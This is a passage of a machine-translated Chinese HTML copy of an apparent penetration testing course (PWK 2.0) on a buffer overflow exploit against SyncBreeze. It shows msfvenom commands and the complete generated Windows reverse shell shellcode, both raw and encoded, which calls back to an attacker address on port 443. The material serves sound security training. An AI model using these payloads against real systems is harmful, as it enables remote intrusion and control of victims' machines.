<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:81447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 找到可用于漏洞利用的 JMP ESP。</font></font></nobr></div>
<div style="position:absolute;top:81475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 更新您的 PoC 以包含发现的 JMP ESP，在其上设置断点，然后按照</font></font></nobr></div>
<div style="position:absolute;top:81494;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行占位符 shellcode。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:81529;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.8</font></font></i></nobr></div>
<div style="position:absolute;top:81529;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Metasploit 生成 Shellcode</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:81567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编写我们自己的自定义 shellcode 超出了本模块的范围。</font><font style="vertical-align: inherit;">然而，Metasploit</font></font></nobr></div>
<div style="position:absolute;top:81586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">框架为我们提供了工具和实用程序，使生成复杂的有效负载变得简单</font></font></nobr></div>
<div style="position:absolute;top:81605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任务。</font></font></nobr></div>
<div style="position:absolute;top:81638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MSFvenom </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">321</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 Msfpayload </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">322</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 Msfencode</font><font style="vertical-align: inherit;">的组合</font><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">323</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将这两个工具放入</font></font></nobr></div>
<div style="position:absolute;top:81657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单个框架实例。</font><font style="vertical-align: inherit;">它可以生成 shellcode 有效载荷并使用各种方式对它们进行编码</font></font></nobr></div>
<div style="position:absolute;top:81677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不同的编码器。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:81739;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自 2015 年 6 月 8 日起，MSFvenom 取代了 msfpayload 和 msfencode。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:81801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目前，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令可以自动生成超过 500 个 shellcode 负载选项，</font></font></nobr></div>
<div style="position:absolute;top:81820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如以下摘录所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:81855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -l 有效载荷</font></font></font></b></nobr></div>
<div style="position:absolute;top:81889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">框架</font><font style="vertical-align: inherit;">负载</font><font style="vertical-align: inherit;">（</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总共 546 个</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）[--payload &lt;value&gt;]</font></font></nobr></div>
<div style="position:absolute;top:81906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==================================================</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:81979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">321 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（陈伟，2014），https://blog.rapid7.com/2014/12/09/good-bye-msfpayload-and-msfencode/</font></font></font></nobr></div>
<div style="position:absolute;top:81999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">322 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2015 年），https://www.offensive-security.com/metasploit-unleashed/msfpayload/</font></font></font></nobr></div>
<div style="position:absolute;top:82019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">323 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2015 年），https://www.offensive-security.com/metasploit-unleashed/msfencode/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:82147;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="70"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 70 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:82180;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:83257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:83257;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:83257;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">390</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:82276;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:82276;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述</font></font></nobr></div>
<div style="position:absolute;top:82292;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:82292;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------</font></font></nobr></div>
<div style="position:absolute;top:82309;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aix/ppc/shell_bind_tcp    </font></font></nobr></div>
<div style="position:absolute;top:82309;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侦听连接并生成命令外壳</font></font></nobr></div>
<div style="position:absolute;top:82326;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aix/ppc/shell_find_port    </font></font></nobr></div>
<div style="position:absolute;top:82326;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在已建立的连接上生成 shell</font></font></nobr></div>
<div style="position:absolute;top:82344;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aix/ppc/shell_interact    </font></font></nobr></div>
<div style="position:absolute;top:82344;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只需 execve /bin/sh （对于 inetd 程序）</font></font></nobr></div>
<div style="position:absolute;top:82360;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aix/ppc/shell_reverse_tcp 连接回攻击者并生成命令外壳</font></font></nobr></div>
<div style="position:absolute;top:82377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:82394;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows/shell_reverse_tcp 连接回攻击者并生成命令外壳</font></font></nobr></div>
<div style="position:absolute;top:82411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:82431;left:277"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 359 - 列出所有 Metasploit shellcode 有效载荷的命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:82460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令是相当容易使用的。</font><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成一个名为的基本有效负载</font></font></nobr></div>
<div style="position:absolute;top:82480;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows/shell_reverse_tcp</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它的作用很像 Netcat 反向 shell。</font><font style="vertical-align: inherit;">此有效负载最低</font></font></nobr></div>
<div style="position:absolute;top:82499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数，该参数定义 shell 的目标 IP 地址。</font><font style="vertical-align: inherit;">一个可选的</font></font></nobr></div>
<div style="position:absolute;top:82518;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也可以定义指定回连端口的</font><i><font style="vertical-align: inherit;">LPORT</font></i><font style="vertical-align: inherit;">参数，我们将使用格式</font></font></nobr></div>
<div style="position:absolute;top:82538;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-f</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择 C ​​格式的 shellcode。</font></font></nobr></div>
<div style="position:absolute;top:82570;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成我们的 shellcode</font><font style="vertical-align: inherit;">的完整</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令如下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:82605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -fc</font></font></font></b></nobr></div>
<div style="position:absolute;top:82622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未选择平台，从有效负载中选择 Msf::Module::Platform::Windows</font></font></nobr></div>
<div style="position:absolute;top:82639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未选择 Arch，从有效载荷中选择 Arch: x86</font></font></nobr></div>
<div style="position:absolute;top:82656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未指定编码器或 badchars，输出原始负载</font></font></nobr></div>
<div style="position:absolute;top:82673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无符号字符 buf[] =</font></font></nobr></div>
<div style="position:absolute;top:82690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xfc\xe8\x82\ </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x00\x00\x00</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> \x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"</font></font></nobr></div>
<div style="position:absolute;top:82707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"</font></font></nobr></div>
<div style="position:absolute;top:82724;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"</font></font></nobr></div>
<div style="position:absolute;top:82741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"</font></font></nobr></div>
<div style="position:absolute;top:82758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"</font></font></nobr></div>
<div style="position:absolute;top:82775;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"</font></font></nobr></div>
<div style="position:absolute;top:82792;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"</font></font></nobr></div>
<div style="position:absolute;top:82809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"</font></font></nobr></div>
<div style="position:absolute;top:82826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"</font></font></nobr></div>
<div style="position:absolute;top:82843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"</font></font></nobr></div>
<div style="position:absolute;top:82860;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"</font></font></nobr></div>
<div style="position:absolute;top:82877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"</font></font></nobr></div>
<div style="position:absolute;top:82894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0b\x00\x12\x68"</font></font></nobr></div>
<div style="position:absolute;top:82911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"</font></font></nobr></div>
<div style="position:absolute;top:82928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"</font></font></nobr></div>
<div style="position:absolute;top:82945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"</font></font></nobr></div>
<div style="position:absolute;top:82962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"</font></font></nobr></div>
<div style="position:absolute;top:82979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"</font></font></nobr></div>
<div style="position:absolute;top:82996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"</font></font></nobr></div>
<div style="position:absolute;top:83012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"</font></font></nobr></div>
<div style="position:absolute;top:83030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</font></font></nobr></div>
<div style="position:absolute;top:83047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";</font></font></nobr></div>
<div style="position:absolute;top:83066;left:335"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 360 - 生成 metasploit shellcode</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:83095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这看起来很简单，但如果我们仔细观察，我们可以识别坏字符（例如 null</font></font></nobr></div>
<div style="position:absolute;top:83115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字节）在生成的 shellcode 中。</font></font></nobr></div>
<div style="position:absolute;top:83147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们不能使用通用 shellcode 时，我们必须对其进行编码以适应我们的目标利用</font></font></nobr></div>
<div style="position:absolute;top:83167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境。</font><font style="vertical-align: inherit;">这可能意味着将我们的 shellcode 转换为纯字母数字负载，</font></font></nobr></div>
<div style="position:absolute;top:83186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">去除不良字符等。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:83335;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="71"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 71 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:83368;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:84445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:84445;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:84445;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">391</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:83464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用先进的多态编码器，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shikata_ga_nai</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">324</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编码我们的shellcode和意志</font></font></nobr></div>
<div style="position:absolute;top:83483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-b</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">通知编码器已知的坏字符</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:83518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -fc –ex</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:83535;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:83552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未选择平台，从有效负载中选择 Msf::Module::Platform::Windows</font></font></nobr></div>
<div style="position:absolute;top:83569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未选择 Arch，从有效载荷中选择 Arch: x86</font></font></nobr></div>
<div style="position:absolute;top:83586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到 22 个兼容的编码器</font></font></nobr></div>
<div style="position:absolute;top:83603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试使用 x86/shikata_ga_nai 的 1 次迭代对有效载荷进行编码</font></font></nobr></div>
<div style="position:absolute;top:83620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 351（迭代 = 0）</font></font></nobr></div>
<div style="position:absolute;top:83637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无符号字符 buf[] =</font></font></nobr></div>
<div style="position:absolute;top:83654;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"</font></font></nobr></div>
<div style="position:absolute;top:83671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a"</font></font></nobr></div>
<div style="position:absolute;top:83688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xf8\x13\xd3\x7b\x70\xf6\xe2\xbb\xe6\x73\x54\x0c\x6c\xd1\x59"</font></font></nobr></div>
<div style="position:absolute;top:83705;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xe7\x20\xc1\xea\x85\xec\xe6\x5b\x23\xcb\xc9\x5c\x18\x2f\x48"</font></font></nobr></div>
<div style="position:absolute;top:83722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xdf\x63\x7c\xaa\xde\xab\x71\xab\x27\xd1\x78\xf9\xf0\x9d\x2f"</font></font></nobr></div>
<div style="position:absolute;top:83739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xed\x75\xeb\xf3\x86\xc6\xfd\x73\x7b\x9e\xfc\x52\x2a\x94\xa6"</font></font></nobr></div>
<div style="position:absolute;top:83755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x74\xcd\x79\xd3\x3c\xd5\x9e\xde\xf7\x6e\x54\x94\x09\xa6\xa4"</font></font></nobr></div>
<div style="position:absolute;top:83772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x55\xa5\x87\x08\xa4\xb7\xc0\xaf\x57\xc2\x38\xcc\xea\xd5\xff"</font></font></nobr></div>
<div style="position:absolute;top:83790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xae\x30\x53\x1b\x08\xb2\xc3\xc7\xa8\x17\x95\x8c\xa7\xdc\xd1"</font></font></nobr></div>
<div style="position:absolute;top:83807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xca\xab\xe3\x36\x61\xd7\x68\xb9\xa5\x51\x2a\x9e\x61\x39\xe8"</font></font></nobr></div>
<div style="position:absolute;top:83824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xbf\x30\xe7\x5f\xbf\x22\x48\x3f\x65\x29\x65\x54\x14\x70\xe2"</font></font></nobr></div>
<div style="position:absolute;top:83840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x99\x15\x8a\xf2\xb5\x2e\xf9\xc0\x1a\x85\x95\x68\xd2\x03\x62"</font></font></nobr></div>
<div style="position:absolute;top:83857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x8e\xc9\xf4\xfc\x71\xf2\x04\xd5\xb5\xa6\x54\x4d\x1f\xc7\x3e"</font></font></nobr></div>
<div style="position:absolute;top:83874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x8d\xa0\x12\x90\xdd\x0e\xcd\x51\x8d\xee\xbd\x39\xc7\xe0\xe2"</font></font></nobr></div>
<div style="position:absolute;top:83891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x5a\xe8\x2a\x8b\xf1\x13\xbd\xbe\x0e\x1b\x2f\xd7\x12\x1b\x4e"</font></font></nobr></div>
<div style="position:absolute;top:83908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x9c\x9a\xfd\x3a\xf2\xca\x56\xd3\x6b\x57\x2c\x42\x73\x4d\x49"</font></font></nobr></div>
<div style="position:absolute;top:83925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x44\xff\x62\xae\x0b\x08\x0e\xbc\xfc\xf8\x45\x9e\xab\x07\x70"</font></font></nobr></div>
<div style="position:absolute;top:83942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xb6\x30\x95\x1f\x46\x3e\x86\xb7\x11\x17\x78\xce\xf7\x85\x23"</font></font></nobr></div>
<div style="position:absolute;top:83959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x78\xe5\x57\xb5\x43\xad\x83\x06\x4d\x2c\x41\x32\x69\x3e\x9f"</font></font></nobr></div>
<div style="position:absolute;top:83976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xbb\x35\x6a\x4f\xea\xe3\xc4\x29\x44\x42\xbe\xe3\x3b\x0c\x56"</font></font></nobr></div>
<div style="position:absolute;top:83993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x75\x70\x8f\x20\x7a\x5d\x79\xcc\xcb\x08\x3c\xf3\xe4\xdc\xc8"</font></font></nobr></div>
<div style="position:absolute;top:84010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x8c\x18\x7d\x36\x47\x99\x8d\x7d\xc5\x88\x05\xd8\x9c\x88\x4b"</font></font></nobr></div>
<div style="position:absolute;top:84027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xdb\x4b\xce\x75\x58\x79\xaf\x81\x40\x08\xaa\xce\xc6\xe1\xc6"</font></font></nobr></div>
<div style="position:absolute;top:84044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x5f\xa3\x05\x74\x5f\xe6";</font></font></nobr></div>
<div style="position:absolute;top:84063;left:294"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 361 - 生成没有坏字符的 shellcode</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:84093;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成的 shellcode 不包含坏字符，长度为 351 个字节，并将发送一个反向 shell</font></font></nobr></div>
<div style="position:absolute;top:84112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到端口 443 上的 IP 地址（在本例中为 10.11.0.4）。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:84147;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.9</font></font></i></nobr></div>
<div style="position:absolute;top:84147;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取壳</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:84185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 SyncBreeze 获取反向 shell 现在应该就像替换我们的 D 缓冲区一样简单</font></font></nobr></div>
